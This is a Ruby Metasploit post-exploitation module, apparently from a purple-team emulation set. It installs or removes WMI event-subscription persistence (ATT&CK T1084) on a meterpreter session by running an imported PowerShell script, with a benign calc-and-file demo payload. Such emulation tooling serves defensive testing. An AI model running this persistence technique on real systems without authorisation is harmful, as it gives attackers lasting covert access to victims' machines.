##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Windows Management Instrumentation Event Subscription (1084) Windows - Purple Team',
                      'Description'   => %q{
                        Persistence:
                        Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts. Examples of events that may be subscribed to are the wall clock time or the computer's uptime. Several threat groups have reportedly used this technique to maintain persistence.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [
                        [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1084' ],
                        [ 'URL', 'https://github.com/n0pe-sled/WMI-Persistence/blob/master/WMI-Persistence.ps1'] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
                register_options(
                     [
                        OptBool.new('CLEANUP', [false, "Cleanup", true])
                     ])
  end

  def run
    begin
      raise "Module requires meterpreter session" if session.type != "meterpreter"
      raise "Module requires admin privileges to write to c:\\" unless is_admin?

      if datastore['CLEANUP']
        print_status("loading powershell...")
        client.run_cmd("load powershell")
        print_status("importing module...")
        client.run_cmd("powershell_import data/purple/t1084/WMI-Persistence.ps1")
        print_status("Executing Remove-Persistence")
        client.run_cmd("powershell_execute Remove-Persistence")
        print_good("Module T1084 execution successful.")
      else
        print_status("loading powershell...")
        client.run_cmd("load powershell")
        print_status("importing module...")
        client.run_cmd("powershell_import data/purple/t1084/WMI-Persistence.ps1")
        print_status("Executing Install-Persistence")
        client.run_cmd("powershell_execute Install-Persistence")
        print_status("Reboot. After a few seconds, calc should spawn and you'll see a file in C:\\t1084.txt")
        print_good("Module T1084 execution successful.")
      end
    rescue::Exception => e
      print_error("#{e.class}: #{e.message}")
      print_error("Module T1208 Failed")
    end

  end
end
